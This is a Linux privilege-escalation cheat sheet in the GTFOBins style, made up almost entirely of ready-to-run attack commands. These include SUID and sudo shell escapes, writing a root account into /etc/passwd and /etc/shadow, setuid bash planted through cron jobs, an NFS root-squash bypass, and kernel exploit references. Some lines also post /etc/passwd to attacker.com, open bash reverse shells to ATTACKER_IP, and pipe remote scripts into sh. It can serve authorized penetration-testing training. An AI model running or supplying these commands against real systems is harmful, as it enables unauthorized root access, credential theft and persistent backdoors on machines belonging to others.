# Linux Privilege Escalation - GTFOBins Quick Reference
# For authorized security testing only

# ============================================
# SUID BINARIES
# ============================================

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Common SUID binaries and exploitation

# bash
./bash -p

# csh
./csh -p

# dash
./dash -p

# find
./find . -exec /bin/sh -p \; -quit
./find / -exec /bin/sh -p \; -quit

# env
./env /bin/sh -p
./env -i /bin/sh -p

# nmap (older versions)
nmap --interactive
!sh

# python
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
./python2 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
./perl -e 'exec "/bin/sh";'

# ruby
./ruby -e 'exec "/bin/sh"'

# lua
./lua -e 'os.execute("/bin/sh")'

# php
./php -r 'pcntl_exec("/bin/sh", ["-p"]);'

# vim
./vim -c ':!/bin/sh'
./vim -c ':set shell=/bin/sh:shell'

# vi
./vi -c ':!/bin/sh'

# nano
# Ctrl+R then Ctrl+X
# reset; sh 1>&0 2>&0

# less
./less /etc/passwd
!/bin/sh

# more
./more /etc/passwd
!/bin/sh

# man
./man man
!/bin/sh

# ftp
./ftp
!/bin/sh

# awk
./awk 'BEGIN {system("/bin/sh")}'

# sed
./sed -n '1e!/bin/sh' /etc/passwd

# gdb
./gdb -nx -ex '!sh' -ex quit

# strace
./strace -o /dev/null /bin/sh

# ltrace
./ltrace /bin/sh

# taskset
./taskset 1 /bin/sh

# time
./time /bin/sh

# timeout
./timeout --foreground 7d /bin/sh

# cp
# Overwrite /etc/passwd
./cp /etc/passwd /tmp/passwd.bak
echo 'root2:$6$salt$hash:0:0:root:/root:/bin/bash' >> /tmp/newpasswd
./cp /tmp/newpasswd /etc/passwd

# mv
# Overwrite /etc/passwd
echo 'root2:$6$salt$hash:0:0:root:/root:/bin/bash' > /tmp/newpasswd
./mv /tmp/newpasswd /etc/passwd

# chmod
./chmod 4755 /bin/bash

# chown
./chown root:root /bin/bash

# tar
./tar cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip
./zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"

# unzip
./unzip -K /tmp/test.zip --unzip-command="sh -c /bin/sh"

# awk
./awk 'BEGIN {system("/bin/sh")}'

# sed
./sed -n '1e!/bin/sh' /etc/passwd

# cut
./cut -d: -f1 /etc/passwd

# paste
./paste /etc/passwd

# tr
./tr '.' ' ' < /etc/passwd

# base64
./base64 -d <<< "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vc2g=" | sh

# curl
./curl file:///etc/passwd
./curl -d "data=file:///etc/passwd" http://attacker.com

# wget
./wget --post-file=/etc/passwd http://attacker.com
./wget -q -O- file:///etc/passwd

# openssl
./openssl enc -base64 -d <<< "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vc2g="

# docker
./docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ============================================
# SUDO MISCONFIGURATION
# ============================================

# Check sudo permissions
sudo -l

# Common sudo exploits

# sudo vim
sudo vim -c ':!/bin/sh'

# sudo find
sudo find . -exec /bin/sh \; -quit

# sudo nmap
sudo nmap --interactive
!sh

# sudo python
sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# sudo perl
sudo perl -e 'exec "/bin/sh";'

# sudo ruby
sudo ruby -e 'exec "/bin/sh"'

# sudo less
sudo less /etc/passwd
!/bin/sh

# sudo man
sudo man man
!/bin/sh

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo sed
sudo sed -n '1e!/bin/sh' /etc/passwd

# sudo ftp
sudo ftp
!/bin/sh

# sudo zip
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"

# sudo tar
sudo tar cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/sh

# sudo strace
sudo strace -o /dev/null /bin/sh

# sudo ltrace
sudo ltrace /bin/sh

# sudo env
sudo env /bin/sh -p
sudo -E env /bin/sh -p

# sudo git
sudo git -p help
!/bin/sh

# sudo ed
sudo ed
!/bin/sh

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo sed
sudo sed '1e exec /bin/sh' /dev/null

# sudo php
sudo php -r 'pcntl_exec("/bin/sh", ["-p"]);'

# sudo lua
sudo lua -e 'os.execute("/bin/sh")'

# ============================================
# CAPABILITIES
# ============================================

# Check capabilities
getcap -r / 2>/dev/null
cat /proc/1/status | grep Cap

# Common capability exploits

# cap_setuid
./binary_with_cap_setuid

# cap_setgid
./binary_with_cap_setgid

# cap_dac_override
# Read any file

# cap_net_bind_service
# Bind to privileged ports

# cap_net_admin
# Network administration

# ============================================
# KERNEL EXPLOITS
# ============================================

# Check kernel version
uname -a
cat /proc/version

# Common kernel exploits

# Dirty COW (CVE-2016-5195)
# Linux kernel 2.6.22 - 4.8.3
./dirtycow

# Dirty Pipe (CVE-2022-0847)
# Linux kernel 5.8 - 5.16.11
./dirtypipe

# PwnKit (CVE-2021-4034)
# polkit 0.105 - 0.120
./pwnkit

# ============================================
# CRON JOBS
# ============================================

# Check cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron

# Cron job exploitation

# Writable cron script
echo '#!/bin/bash
chmod +s /bin/bash' > /etc/cron.d/evil
chmod +x /etc/cron.d/evil

# Cron with PATH manipulation
# Create script in PATH before real binary
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/evil
chmod +x /tmp/evil

# ============================================
# WORLD-WRITABLE FILES
# ============================================

# Find world-writable files
find / -perm -0777 -type f 2>/dev/null

# Find world-writable directories
find / -perm -0777 -type d 2>/dev/null

# Exploit world-writable files

# World-writable /etc/passwd
echo 'root2:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# World-writable /etc/shadow
echo 'root2:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/shadow

# ============================================
# NFS MISCONFIGURATION
# ============================================

# Check NFS exports
cat /etc/exports

# NFS root squashing bypass
# On attacker:
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# On target:
/share/rootbash -p

# ============================================
# USEFUL SCRIPTS
# ============================================

# LinPEAS (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
curl -L https://github.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh

# linuxprivchecker
python linuxprivchecker.py

# ============================================
# REVERSE SHELLS
# ============================================

# From SUID binary
./suid_binary -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# From cron job
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /tmp/evil.sh
chmod +x /tmp/evil.sh

# From writable script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> writable_script.sh
